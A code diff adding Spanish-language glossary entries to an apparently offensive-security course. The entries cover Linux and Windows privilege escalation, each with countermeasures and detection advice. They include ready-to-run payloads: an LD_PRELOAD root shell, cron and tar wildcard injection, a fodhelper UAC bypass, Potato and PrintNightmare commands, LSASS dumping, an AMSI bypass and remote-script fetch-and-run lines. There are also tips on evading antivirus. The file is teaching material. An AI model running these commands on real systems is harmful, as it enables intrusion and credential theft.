+      "\n**CVE-2024-21626 (runc leaky-vessels):**\nEnero 2024. Container escape via file descriptors leaked. Impacta Docker/Kubernetes ampliamente.\n" +
+      "\n**CVE-2019-14271 (docker cp):**\nBug en `docker cp` permite RCE cuando se copia files de container comprometido al host.\n" +
+      "\n**Buscar exploits aplicables:**\n" +
+      "```bash\n# linux-exploit-suggester\ncurl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh\n\n# LinPEAS incluye kernel exploit lookup:\n./linpeas.sh -o SysI    # solo system info + exploits\n\n# CVE search por kernel version\nuname -r                    # kernel version\nsearchsploit linux kernel 5.15\n```\n" +
+      "\n**Container escape checks (post-shell in container):**\n" +
+      "```bash\n# ¿Estamos en container?\ncat /proc/1/cgroup            # docker/lxc en el path\nls -la /.dockerenv            # existe = Docker\n\n# ¿Tenemos capabilities peligrosas?\ncapsh --print                 # capabilities disponibles\n\n# ¿Docker socket montado?\nls -la /var/run/docker.sock   # si sí = escape trivial\n\n# ¿Privileged container?\nps -ef; ls /dev              # con --privileged, /dev tiene devices del host\n```\n" +
+      "\n**deepce.sh** — automated Docker enum + escape:\n```bash\ncurl -L https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh | sh\n```\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Patch management** — kernel updates automáticos (unattended-upgrades)\n" +
+      "• **Rootless containers** (Podman rootless, Docker rootless mode)\n" +
+      "• **User namespaces** activos en Docker\n" +
+      "• **Read-only root filesystem** en containers cuando posible\n" +
+      "• **Drop capabilities** — `--cap-drop=ALL --cap-add=NET_BIND_SERVICE` explicit\n" +
+      "• **AppArmor/SELinux** profiles for containers\n" +
+      "• **gVisor / Kata Containers** — user-space kernel para aislamiento fuerte\n" +
+      "> 💡 En un pentest Linux, **linux-exploit-suggester + LinPEAS + kernel version** rutinariamente encuentran CVEs LPE aplicables.\n" +
+      "> ⚠️ Container escape en producción es **incident critical** — no probar en prod sin autorización específica.",
+    examples: [
+      "PwnKit (2022): 12 años de bug en polkit, exploited en scale por semanas post-disclosure.",
+      "runc leaky-vessels (CVE-2024-21626): docker/K8s widespread impact, patches en horas.",
+      "DirtyPipe writeup de Max Kellermann: uno de los papers más elegantes de kernel exploitation.",
+    ],
+    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Vulnerable and Outdated Components", "Kubernetes security (RBAC)"],
+  },
+  {
+    id: 347,
+    module: 31,
+    term: "Sudo avanzado, cron injection, wildcard exploitation",
+    short: "sudo con env_keep=LD_PRELOAD, cron writable, wildcard injection en tar/rsync. Config bugs sutiles con RCE trivial.",
+    detail:
+      "Más allá de GTFOBins, hay clases de bugs sutiles en config Linux que llevan a privesc. Los principales:\n" +
+      "\n**Sudo con env_keep dangerosos:**\n" +
+      "\n**LD_PRELOAD:**\nSi `env_keep+=LD_PRELOAD` está en sudoers, el user puede precargar una .so maliciosa que se ejecuta como root:\n" +
+      "```bash\n# Verificar\nsudo -l         # buscar env_keep=LD_PRELOAD\n\n# Exploit\ncat > /tmp/x.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0); setuid(0);\n    system(\"/bin/bash\");\n}\nEOF\ngcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\nsudo LD_PRELOAD=/tmp/x.so cualquier-comando   # root shell\n```\n" +
+      "\n**LD_LIBRARY_PATH:**\nSimilar, pero manipula qué library se carga.\n" +
+      "\n**PYTHONPATH:**\nSi sudo permite ejecutar un script Python + `env_keep+=PYTHONPATH`, colocá un módulo malicioso con el mismo nombre:\n" +
+      "```python\n# En /tmp/os.py\nimport subprocess; subprocess.call(['/bin/bash'])\n```\n```bash\nsudo PYTHONPATH=/tmp /path/to/legit_script.py\n```\n" +
+      "\n**Sudo path hijacking (env_keep+=PATH):**\nMenos común pero explotable.\n" +
+      "\n**Sudo con NOPASSWD y `!requiretty` (histórico):**\n\n**CVE-2021-3156 (Sudo Baron Samedit, enero 2021):**\nBug de heap overflow en sudo que afectaba **casi toda instalación Linux** (versiones 1.8.2-1.9.5p1). Explotable **sin necesidad de sudo permission previo** — el bug es en el parsing.\n" +
+      "```bash\nsudoedit -s /   # crash bug de sudo\n```\nExploits públicos derivan root shell.\n" +
+      "\n**Cron injection avanzado:**\n\n**Script writable con cron root:**\n```bash\n# /etc/crontab tiene:\n* * * * * root /home/user/backup.sh\n\n# Si backup.sh es writable por 'user' (permission bug):\necho 'chmod +s /bin/bash' >> /home/user/backup.sh\n# Esperar 1 min → /bin/bash es SUID root\n/bin/bash -p    # root shell (heredando UID)\n```\n" +
+      "\n**Writable PATH que cron usa:**\n```bash\n# /etc/crontab tiene PATH que incluye /home/user/bin ANTES de /usr/bin\n# * * * * * root /some/script.sh (que usa 'ls' sin ruta)\n\necho '#!/bin/bash\\nchmod +s /bin/bash' > /home/user/bin/ls\nchmod +x /home/user/bin/ls\n# Cron corre 'ls' → tu 'ls' malicioso corre como root\n```\n" +
+      "\n**Wildcard injection (`*` en scripts):**\nSi un script como root hace `tar -cf backup.tar *` en un directorio writable:\n```bash\n# En el dir writable\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=sh runme.sh'\necho '/bin/sh' > runme.sh\nchmod +x runme.sh\n# Cuando el cron corre 'tar -cf backup.tar *':\n# Se expande a 'tar -cf backup.tar --checkpoint=1 --checkpoint-action=exec=sh runme.sh <resto>'\n# → RCE como root\n```\nAplicable a: `tar`, `rsync`, `chown`, `chmod`, cualquier command que use wildcards con args.\n" +
+      "\n**Rsync wildcard:**\n```bash\ntouch -- '-e sh runme.sh'\n# rsync -av * remote: → ejecuta runme.sh como root\n```\n" +
+      "\n**chown recursivo:**\n```bash\n# En dir writable\nln -s /etc/shadow rootfile\n# root luego hace chown user:user rootfile → chown -h no dereferences → chown recursivo sí\n```\n" +
+      "\n**PATH inheritance de daemons:**\nAlgunos daemons (Apache, PHP-FPM) heredan PATH de su init. Si un include ejecuta `system('echo')` sin ruta y hay un PATH writable → hijack.\n" +
+      "\n**NFS con no_root_squash:**\nMount NFS con `no_root_squash` permite que root del cliente escriba como root en el share.\n" +
+      "```bash\n# Cliente monta remote NFS con root_squash desactivado\nmount -t nfs server:/share /mnt\n# Copiar SUID bash al share\ncp /bin/bash /mnt/rootbash\nchmod +s /mnt/rootbash\n# En el servidor NFS, /rootbash es SUID root → shell root\n```\n" +
+      "\n**Contramedidas:**\n" +
+      "• **Nunca env_keep=LD_PRELOAD** en sudoers.\n" +
+      "• **Absolute paths** en cron scripts + sanitizar wildcards (`--`).\n" +
+      "• **Permisos strict** en scripts de cron (owned by root, not writable).\n" +
+      "• **NFS con `root_squash`** siempre.\n" +
+      "• **sudo `!requiretty` off** salvo casos específicos.\n" +
+      "> 💡 **CVE-2021-3156 Baron Samedit** fue apocalipsis-level — un local user con shell podía escalar en 100% de Linuxes.\n" +
+      "> ⚠️ Wildcard injection es **subtle** — el 90% de sysadmins no lo sabe. Frecuente en homelab/small business.",
+    examples: [
+      "OSCP: sudo env_keep+=LD_PRELOAD en 30% de labs de privesc.",
+      "Wildcard injection en cron `chown` — CTF classic.",
+      "Baron Samedit (CVE-2021-3156): impacto masivo en enero 2021.",
+    ],
+    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Bits especiales SUID/SGID/sticky", "LinPEAS, LinEnum y pspy"],
+  },
+  {
+    id: 348,
+    module: 31,
+    term: "Linux capabilities y namespaces exploitation",
+    short: "Capabilities granulan root. Un binary con cap_setuid es efectivo SUID. cap_dac_read_search lee todo. cap_sys_admin es casi root.",
+    detail:
+      "Las **Linux capabilities** (POSIX capabilities) subdividen root en ~40 permisos granulares. Cada capability puede asignarse a binaries, threads, o procesos. Mal asignadas, dan escalada.\n" +
+      "\n**Enumeración:**\n" +
+      "```bash\n# Todos los binaries con capabilities en el system\ngetcap -r / 2>/dev/null\n\n# Capabilities del proceso actual\ncapsh --print\n\n# Capabilities de un proceso específico\ncat /proc/<pid>/status | grep Cap\n```\n" +
+      "\n**Formato de output:**\n```\n/usr/bin/python3.11 = cap_setuid+ep\n```\n• **cap_setuid** — la capability.\n• **+ep** — flags: e=effective, p=permitted, i=inheritable.\n\n" +
+      "\n**Capabilities peligrosas comunes:**\n\n**cap_setuid+ep:**\n```bash\ngetcap /usr/bin/python3\n# → cap_setuid+ep\n\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# → root shell\n```\nEl proceso puede llamar `setuid(0)` sin ser root. Efectivo SUID pero más difícil de detectar.\n" +
+      "\n**cap_dac_read_search+ep:**\n\"Read any file, bypass all DAC\". Con este cap puedo leer `/etc/shadow`, private SSH keys, etc.\n" +
+      "```bash\ngetcap /usr/bin/tar → cap_dac_read_search+ep\ntar cf /tmp/shadow.tar /etc/shadow\n```\n\n**cap_dac_override+ep:**\nSimilar pero write también.\n\n**cap_sys_admin+ep:**\nCasi equivalente a root. Permite mount, load modules, otras 20+ operaciones. Regularmente escalable a root full.\n" +
+      "```bash\n# Con cap_sys_admin en un binary\n# Mount bind del rootfs para modificar como user:\nmount --bind /etc /tmp/etc-hijack\n# Modificar /etc/passwd via /tmp/etc-hijack\n```\n\n**cap_net_admin+ep:**\nManipula config de red. Puede sniffing con NFQUEUE, iptables rules, etc.\n\n**cap_sys_ptrace+ep:**\nAttach a otros procesos con ptrace → dump memoria, inject shellcode.\n" +
+      "```bash\ngdb -p <pid_del_proceso_privileged>\ncall system(\"chmod +s /bin/bash\")\n```\n" +
+      "\n**cap_chown+ep:**\nCambiar ownership de cualquier file. Útil para chown /etc/shadow → own, then edit.\n" +
+      "\n**cap_setgid+ep:**\nSimilar a setuid pero GID. Menos crítico pero escalable con group memberships.\n" +
+      "\n**Namespace exploitation:**\n\n**User namespaces (introduced en kernel 3.8):**\nUn proceso puede crear su propio namespace donde es \"root\" **dentro** del namespace (mapped a user UID afuera). Puede tener capabilities dentro del namespace.\n\n**Exploit clásico:** dentro del user namespace tenés cap_sys_admin, con mount para escapar:\n" +
+      "```bash\nunshare -U -r bash    # user namespace, mapped to root inside\n# Now root inside\n# Múltiples CVEs históricos permitían escape\n```\n\n**CVE-2022-0185 (Filesystem Context):** user namespace + FSCONTEXT bug → root escape.\n\n**CVE-2021-3493 (OverlayFS + user_ns):** overlay + user namespace → LPE en Ubuntu.\n\n**PID namespaces:**\nEscape common si el container no isola pid namespace correctamente. Ver PIDs del host → attach.\n\n**Network namespaces:**\nPor sí solo no escalable, pero combinado con capabilities → sniffing sobre el host.\n\n**Mount namespaces:**\nBind mount de `/` del host dentro de un container comprometido = full read access.\n" +
+      "\n**Setpriv / capsh alternative:**\n```bash\nsetpriv --inh-caps=+setuid --ambient-caps=+setuid ...\n```\nAmbient capabilities (kernel 4.3+) heredan capabilities entre execve.\n" +
+      "\n**Contramedidas:**\n" +
+      "• **`getcap -r / 2>/dev/null | grep -v '^$'`** en auditoría — nada debería tener cap_setuid, cap_dac_read_search, cap_sys_admin sin razón fuerte.\n" +
+      "• **Minimum caps** — servicios deberían drop caps a lo mínimo (systemd `CapabilityBoundingSet=`).\n" +
+      "• **sysctl -w kernel.unprivileged_userns_clone=0** — desactiva user namespaces (Ubuntu default post-CVE-2022-0185 in some kernels).\n" +
+      "• **SELinux/AppArmor** profiles que restringen incluso a root.\n" +
+      "• **AuditD** rules on capability-granting binaries execution.\n" +
+      "> 💡 `getcap -r /` es el primer check post-shell después de SUID enum. Muchas escaladas modernas viven acá.\n" +
+      "> ⚠️ Capabilities son **más difíciles de detectar** que SUID — no aparecen en `find -perm -4000`. LinPEAS los cubre por default.",
+    examples: [
+      "OSCP: Python con cap_setuid+ep = escalada instant. Aparecía en 20% de labs.",
+      "Kubernetes escape 2022 (CVE-2022-0185): user namespace + FSCONTEXT.",
+      "gdb con cap_sys_ptrace attach a systemd → escalada.",
+    ],
+    related: ["Sudo, cron y PATH hijacking", "GTFOBins y binarios abusables", "Kernel exploits y container escape", "LinPEAS, LinEnum y pspy"],
+  },
 
   // ── M32 · Escalada de Privilegios: Windows ───────────────────────────────
   {
@@ -4339,6 +4754,102 @@ export const DEFINITIONS: ConceptDefinition[] = [
       "Robar un hash NTLM para Pass-the-Hash a otra máquina.",
     ],
     related: ["Token impersonation y Potato", "Ataques a Active Directory", "Movimiento lateral"],
+  },
+  {
+    id: 354,
+    module: 32,
+    term: "WinPEAS, PowerUp y Seatbelt",
+    short: "Automated enumeration para Windows privesc. WinPEAS con highlighting, PowerUp para PowerShell nativo, Seatbelt para .NET granular.",
+    detail:
+      "Similar a LinPEAS en Linux, Windows tiene tres herramientas dominantes de enum post-shell.\n" +
+      "\n**WinPEAS (Peass-ng):**\nEl estándar para escalada Windows. Binary standalone .exe o .bat.\n" +
+      "```powershell\n# Descargar (host con AV desactivado o path bypass)\ncurl.exe -o winPEAS.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe\n.\\winPEAS.exe\n\n# Modo específico\n.\\winPEAS.exe systeminfo\n.\\winPEAS.exe applicationsinfo\n.\\winPEAS.exe filesinfo\n```\n" +
+      "\n**Checks cubiertos** (200+):\n• System info + patchlist → CVE lookups\n• Users, groups, memberships\n• Sessions activas (whoami /priv, /groups)\n• Services (unquoted paths, weak permissions, DLL hijacking candidates)\n• Scheduled tasks writable\n• Registry keys interesantes (AlwaysInstallElevated, autologon, PuTTY sessions, WinSCP)\n• AppLocker/UAC config\n• Anti-virus + EDR product detection\n• Credentials en filesystem (unattend.xml, sysprep, PowerShell history, browser passwords)\n• NTLM/Kerberos tickets in memory\n• Cached passwords + LSA secrets\n\n**Color highlights:**\n• 🔴 RED — vulnerable/explotable\n• 🟡 YELLOW — interesting\n• 🔵 BLUE — informational\n\n**PowerUp (PowerShell, PowerSploit legacy pero mantenido):**\nEnfocado en service misconfigurations + registry paths + PATH abuse. Ideal cuando ya tenés PowerShell disponible sin necesidad de dropar binary.\n" +
+      "```powershell\n# Import\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')\n\n# All checks\nInvoke-AllChecks\n\n# Individual\nGet-UnquotedService\nGet-ModifiableServiceFile\nGet-RegistryAlwaysInstallElevated\nGet-ModifiablePath -Path $env:PATH\n```\n**AMSI-detected en Defender moderno** — requiere bypass previo.\n" +
+      "\n**Seatbelt (C# / .NET):**\nDe SpecterOps. Modo defensivo Y ofensivo — 60+ checks. Más granular que WinPEAS. Requiere compilar o dropar `.exe`.\n" +
+      "```\nSeatbelt.exe -group=all              # todos los checks\nSeatbelt.exe DNSCache DomainSessions\nSeatbelt.exe -group=user LoggedOnUsers\n```\n\n**Checks únicos Seatbelt:**\n• `RDPSavedConnections` — hosts guardados en RDP client\n• `PuttySSH` — sesiones PuTTY con creds\n• `SecPackageCredentials` — credenciales cached en Credential Manager\n• `WindowsCredentialFiles` — DPAPI-protected creds parseables offline con SharpDPAPI\n• `IEUrls` — history browser\n• `SysmonSettings` — detectar si Sysmon está deployado\n\n**Complementarias:**\n\n**SharpUp** — port de PowerUp a C# / .NET. Menos AMSI-detectable que PowerShell.\n\n**BeRoot / Watson** — específicos para kernel exploits Windows (uname → CVE lookup).\n\n**PrivescCheck** (PowerShell):\nMás nuevo (2020). Excelente report HTML.\n```powershell\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')\nInvoke-PrivescCheck -Extended -Report result.html -Format HTML\n```\n\n**Workflow OSCP típico Windows:**\n```\n1. whoami /priv /groups /all       (1 min)\n2. .\\winPEAS.exe                    (5 min, generate output)\n3. PrivescCheck.ps1 → HTML report  (backup en case AMSI kills)\n4. Buscar patrones en output:\n   - SeImpersonatePrivilege → Potato family\n   - Unquoted service path writable → binary planting\n   - AlwaysInstallElevated → MSI privilege exec\n   - Insecure service permissions → sc config binPath\n```\n\n**Bypass AMSI para ejecutar PowerShell tools:**\n```powershell\n# Classic (muy signaturado)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Nuevas técnicas: hardware breakpoints, memory patching via P/Invoke\n```\n\n**Contramedidas defender:**\n• **Sysmon con SwiftOnSecurity ruleset** — detecta ejecución de peass, powersploit, etc.\n• **AMSI habilitado + logging (Event 4104)** — captura scripts PowerShell y contenido pre-execution.\n• **Defender for Endpoint / EDR moderno** — detecta patrones de enum masivo.\n• **AppLocker/WDAC** — allowlist de ejecutables permitidos.\n" +
+      "> 💡 En 2024, **AMSI + Defender for Endpoint** hacen de PowerUp legacy muy difícil de correr sin bypass previo. Seatbelt/SharpUp compilados custom son alternativas.\n" +
+      "> ⚠️ WinPEAS.exe es **detected instantly** por casi todo AV. Compilar variantes con signature evasion o correr en memoria (Invoke-Expression + WebClient).",
+    examples: [
+      "OSCP: `.\\winPEAS.exe` es first-step tras shell as user en Windows lab.",
+      "SpecterOps SharpUp: reemplazo C# de PowerUp para AMSI evasion.",
+      "PrivescCheck: HTML report + integrated CVE checks. Muy usado por consultores.",
+    ],
+    related: ["Primitivas de escalada", "Token impersonation y Potato", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "PowerShell ofensivo"],
+  },
+  {
+    id: 355,
+    module: 32,
+    term: "Potato family: SeImpersonatePrivilege abuse",
+    short: "Hot/Rotten/Juicy/Rogue/PrintSpoofer/GodPotato — 10+ años de exploits que abusan SeImpersonatePrivilege para escalar a SYSTEM.",
+    detail:
+      "Los ataques 'Potato' son una familia de exploits que abusan del privilege **SeImpersonatePrivilege** (asignado por default a IIS/MSSQL/services accounts) para escalar a SYSTEM. La familia evoluciona desde 2016 con updates por Windows patches.\n" +
+      "\n**Contexto:**\nSi tenés shell como IIS AppPool user, MSSQL service account, o similar, seguramente tenés:\n" +
+      "```powershell\nwhoami /priv\n# SeImpersonatePrivilege     State: Enabled\n# SeAssignPrimaryTokenPrivilege  (a veces)\n```\nEsto permite **impersonate** cualquier token que se te presente. La técnica Potato es forzar que un servicio SYSTEM se autentique **hacia tu proceso** → capturás su token → impersonate → SYSTEM shell.\n" +
+      "\n**Timeline de la familia:**\n\n**Hot Potato (2016):**\nRuben Boonen + Steven Vittitoe. Primera versión. Combina NBNS spoofing + WPAD + local NTLM relay. Complejo, sólo Win 7-8. Deprecado.\n" +
+      "\n**Rotten Potato (2016):**\nStephen Breen (Foxglove). Simplificación: abusa DCOM local para forzar auth SYSTEM a nuestro RPC listener local. Win 7-2016.\n" +
+      "\n**Lonely Potato (2017):**\nAdaptación de Rotten para bypass de session isolation.\n" +
+      "\n**Juicy Potato (2018):**\nOhpe. Fork mejorado de Rotten. Soporte para custom CLSID (BITSv3, etc). El más usado en OSCP históricamente.\n" +
+      "```powershell\n# Juicy Potato requiere OXID resolver visible\n.\\JuicyPotato.exe -l 8888 -p c:\\windows\\system32\\cmd.exe -a \"/c calc.exe\" -t *\n```\n**Muerto en Win 10 1809+** (Microsoft patched OXID resolver behavior).\n" +
+      "\n**Rogue Potato (2020):**\nAntonio Cocomazzi. Bypass del patch de Juicy usando fake OXID resolver **externo** (necesita otro server accesible en la red).\n" +
+      "```powershell\n.\\RoguePotato.exe -r 10.10.10.5 -e \"cmd.exe /c calc.exe\" -l 9999\n# 10.10.10.5 = otro host con socat listening (redirect a un evil OXID resolver del atacante)\n```\n\n**PrintSpoofer (2020):**\nItm4n. Abusa el Print Spooler service (SYSTEM) via named pipe. Sin necesidad de OXID externo. **Silver bullet moderno.**\n```powershell\n.\\PrintSpoofer.exe -i -c \"cmd.exe\"\n# -i: interactive shell as SYSTEM\n```\nRequiere Print Spooler running (default en Win 10, opt-in en Server post-PrintNightmare).\n\n**GodPotato (2023):**\nBugChecker. Similar a PrintSpoofer pero usa RPC/DCOM en vez de Print Spooler → funciona **incluso con Spooler deshabilitado**. Best current option.\n```powershell\n.\\GodPotato.exe -cmd \"cmd.exe /c calc.exe\"\n```\n\n**SweetPotato:**\nMeta-tool que auto-selecciona entre PrintSpoofer/Rogue/Juicy según lo que funciona en el target.\n\n**RemotePotato0:**\nCross-session (roba token de un user logueado en otra session RDP, incluyendo Domain Admin).\n\n**Mecánica interna común:**\n1. Attacker con SeImpersonate corre payload.\n2. Trigger — hace que un servicio SYSTEM abra una connection al proceso attacker (via RPC, Print Spooler, WSMan, DCOM).\n3. El proceso attacker captura el token en el handshake.\n4. `DuplicateTokenEx` → `CreateProcessWithTokenW` con el token capturado.\n5. New process runs as SYSTEM.\n\n**Detección (blue team):**\n• **Sysmon Event 1** — creación de procesos hijos con SYSTEM privileges desde un IIS/MSSQL parent.\n• **Sysmon Event 3** — connections outbound raras del web app process.\n• **Windows Security Event 4624** logon type 9 (NewCredentials) desde servicios locales.\n• **EDR moderno** detecta patrones RPC/DCOM anómalos.\n• **Print Spooler logging** — Windows Event 316 desde Microsoft-Windows-PrintService/Operational.\n\n**Contramedidas:**\n• **Quitar SeImpersonatePrivilege** de service accounts (no siempre posible).\n• **Deshabilitar Print Spooler** en servers que no imprimen.\n• **Deshabilitar WebClient service** — cierra un vector adicional (`\\localhost\\...`).\n• **Least privilege service accounts** — no correr IIS como user con Impersonate si no se necesita.\n> 💡 En 2024, **GodPotato** es el go-to. PrintSpoofer y Juicy son legacy pero sirven en labs viejas.\n> ⚠️ Todos los Potato son **flagged por Defender** con signatures. Compilar variantes custom o correr in-memory con reflective loading.",
+    examples: [
+      "OSCP legacy: Juicy Potato en Server 2016 era 90% de los casos IIS.",
+      "GodPotato 2023: cubre Windows 8-11 + Server 2012-2022, PrintSpoofer no cubría Server 2022 hardened.",
+      "Real world: web shell PHP con IIS user → GodPotato → SYSTEM → mimikatz.",
+    ],
+    related: ["Token impersonation y Potato", "Primitivas de escalada", "PowerShell ofensivo", "Servicios vulnerables"],
+  },
+  {
+    id: 356,
+    module: 32,
+    term: "UAC bypass moderno + Registry hijacking",
+    short: "fodhelper, computerdefaults, sdclt, DiskCleanup — abuso de auto-elevate binaries + registry redirection. Cambia con cada Windows release.",
+    detail:
+      "**UAC** (User Account Control) es la feature de Windows que separa el 'user token' del 'admin token' incluso cuando el user es Local Administrator. Un binary auto-elevate corre como admin sin prompt; un user process corre como medium integrity.\n" +
+      "\nUAC bypass = ejecutar código con integrity high (admin) desde medium integrity **sin UAC prompt**. No es LPE (ya sos admin), pero es útil para ejecutar payloads con full admin rights sin interacción del user.\n" +
+      "\n**Concepto core: auto-elevate binaries:**\nWindows tiene ~10 binaries con `autoElevate=true` en su manifest. Corren como high integrity automáticamente. Si esos binaries **leen registry keys** que el user medium puede escribir, controlar qué se ejecuta.\n" +
+      "\n**fodhelper.exe (Features on Demand):**\nEl más famoso. Lee `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`:\n```powershell\n# Setup registry redirect\nNew-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'cmd.exe /c calc.exe'\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value ''\n\n# Trigger\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'\n# → calc.exe runs high integrity, sin prompt UAC\n```\n\n**computerdefaults.exe:**\nMismo mecanismo. Sirve como backup si fodhelper es deshabilitado.\n" +
+      "\n**sdclt.exe (Backup):**\nHKCU\\Software\\Classes\\Folder\\shell\\open\\command → auto-elevate.\n**Patched en Windows 10 1809+** (rara vez funciona post-2018).\n\n**DiskCleanup (via ScheduledTask):**\nSilentCleanup scheduled task tiene highest privileges. Un env var expandido en el path del task → hijack.\n\n**eventvwr.exe (Event Viewer):**\nLee `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command`. Uno de los primeros documentados (2016).\n\n**wsreset.exe:**\nWindows Store reset. Lee HKCU keys de Store schema.\n\n**Otras 2023-2024:**\n• **cleanmgr.exe** con XML config\n• **CompMgmtLauncher.exe**\n• **AppUninstaller.exe**\n\n**UACME repo (hfiref0x):**\ngithub.com/hfiref0x/UACME — catálogo de 78+ técnicas de UAC bypass. Cada release Windows patches algunas → new ones surface.\n\n**Bypass sin registry (más stealth):**\n\n**Token duplication desde high-integrity process:**\nSi un proceso high-integrity ya corre y tenés SeDebugPrivilege → open handle → duplicate token → CreateProcessWithTokenW.\n\n**DLL sideloading en high-integrity dirs:**\nColocar DLL en `C:\\Windows\\System32\\` (write requires admin, pero via UAC bypass o admin write en subdirs) → binary auto-elevate carga la DLL.\n\n**COM Interface abuse (Cortana, Bluetooth):**\nElevatedCOMinterface accesible desde medium integrity. `IColorDataProxy`, `ICMLuaUtil` han sido usados.\n\n**Empire / Metasploit modules:**\n```\n# Metasploit\nuse exploit/windows/local/bypassuac_fodhelper\nuse exploit/windows/local/bypassuac_dotnet_profiler\nuse exploit/windows/local/bypassuac_eventvwr\n```\n\n**Contramedidas:**\n• **UAC = Always Notify** (max slider) → algunos bypasses fallan pero no todos.\n• **AppLocker/WDAC** — allowlist de qué puede correr en high integrity.\n• **LAPS** — random local admin password, rotated → aunque bypass funcione, less impact.\n• **Attack Surface Reduction (ASR) rules** — bloquean patterns de bypass.\n• **Windows Defender Credential Guard** protege contra dump post-bypass.\n• **Application Guard** aislar apps de alto riesgo.\n\n**Blue team detection:**\n• **Sysmon Event 12/13/14** — Registry set en paths conocidos de bypass (`ms-settings\\Shell`).\n• **Sysmon Event 1** — auto-elevate binaries corriendo con parent unexpected.\n• **AutoElevate audit** con Sysinternals SysMonitor.\n> 💡 UAC bypass es útil para **stealth ops** (evitar prompt visible), pero NO es privilege escalation clásica — ya sos admin.\n> ⚠️ Cada Windows Feature Update (11 22H2, 24H2) patches 3-5 bypasses. Verificar UACME antes de asumir uno funciona.",
+    examples: [
+      "UACME: 78 técnicas catalogadas, community-maintained.",
+      "Red team: fodhelper para ejecutar Cobalt Strike beacon con high integrity sin UAC popup.",
+      "Blue team: Sysmon rule sobre HKCU\\Software\\Classes\\ms-settings creation detecta trivialmente.",
+    ],
+    related: ["Primitivas de escalada", "AV/EDR evasion moderna: AMSI, ETW, syscall directas", "PowerShell ofensivo", "Registro de Windows"],
+  },
+  {
+    id: 357,
+    module: 32,
+    term: "PrintNightmare, DPAPI y LSASS dumping",
+    short: "CVE-2021-34527 (PrintNightmare) → RCE con user. DPAPI vaults + LSASS dumping para credenciales — vectors críticos post-compromise.",
+    detail:
+      "Tres vectores separados pero relacionados por explotar internals de Windows.\n" +
+      "\n**PrintNightmare (CVE-2021-1675 + CVE-2021-34527, junio 2021):**\nBug en Print Spooler que permite **cualquier user autenticado del dominio agregar una impresora con driver malicioso**. El driver install runs como SYSTEM → RCE.\n\n**Impact scope:**\n• Local privilege escalation (user → SYSTEM local).\n• **Remote code execution en cualquier server con Spooler** — DCs incluidos.\n• Vector para dominio compromise (RCE en DC).\n\n**Exploit primario:**\n```powershell\n# CVE-2021-1675 - local privesc via Point-and-Print\n# CVE-2021-34527 - remote via SMB path a driver malicioso\n\n# Impacket (Python)\npython3 CVE-2021-1675.py CORP.LOCAL/user:pass@target '\\\\attacker\\\\share\\\\evil.dll'\n\n# Windows (PowerShell)\nImport-Module .\\CVE-2021-1675.ps1\nInvoke-Nightmare -DriverName 'PrintNightmare' -NewUser 'attacker' -NewPassword 'Passw0rd!'\n# Crea local admin\n```\n\n**Windows patched múltiples veces** (JuI 2021, ago 2021, sep 2021, feb 2022). Cada patch fue bypassable brevemente.\n\n**Fix definitivo:**\n• Deshabilitar Point-and-Print para non-admins: `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint`\n• Deshabilitar Print Spooler donde no se necesita (DCs, file servers).\n" +
+      "\n**DPAPI (Data Protection API):**\nAPI de Windows que cifra datos sensibles per-user o per-machine. Usa keys derivadas del password del user (o machine key). Muchas apps guardan credentials via DPAPI:\n\n• Chrome/Edge saved passwords\n• Outlook profiles\n• PuTTY sessions (RegEdit encrypted values)\n• WinSCP saved connections\n• Windows Credential Manager entries\n• Windows Vault (Wi-Fi passwords, etc.)\n• RDP saved credentials\n\n**DPAPI attack (offline con MASTERKEY + user password):**\n```powershell\n# 1. Enumerar\nSharpDPAPI.exe blob    # lista DPAPI blobs\nSharpDPAPI.exe rdcman   # RDP Manager saved creds\nSharpDPAPI.exe machine  # machine-scoped DPAPI\nSharpDPAPI.exe backupkey /server:dc.corp.local /pvk:key.pvk  # domain backup key (needs DA)\n\n# 2. Decrypt with domain backup key\nSharpDPAPI.exe triage /pvk:backupkey.pvk\n```\n\n**mimikatz DPAPI:**\n```\nmimikatz # dpapi::cache\nmimikatz # dpapi::masterkey /in:\"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\<masterkey>\" /rpc\n```\n\n**LSASS dumping:**\nLSASS.exe mantiene en memoria: passwords cleartext (WDigest si habilitado), NTLM hashes, Kerberos tickets, Windows Credentials, etc.\n\n**Herramientas:**\n\n**Task Manager (basic):**\n```\nRight click LSASS.exe → Create dump file\n# Salida: C:\\Users\\...\\AppData\\Local\\Temp\\lsass.DMP\n```\n\n**procdump (Sysinternals, comúnmente whitelisted):**\n```powershell\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n**comsvcs.dll (living-off-the-land):**\n```powershell\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <lsass_pid> C:\\temp\\lsass.dmp full\n```\n\n**PPLDump / PPLFault / PPLBlade:**\nCuando LSASS es **Protected Process Light 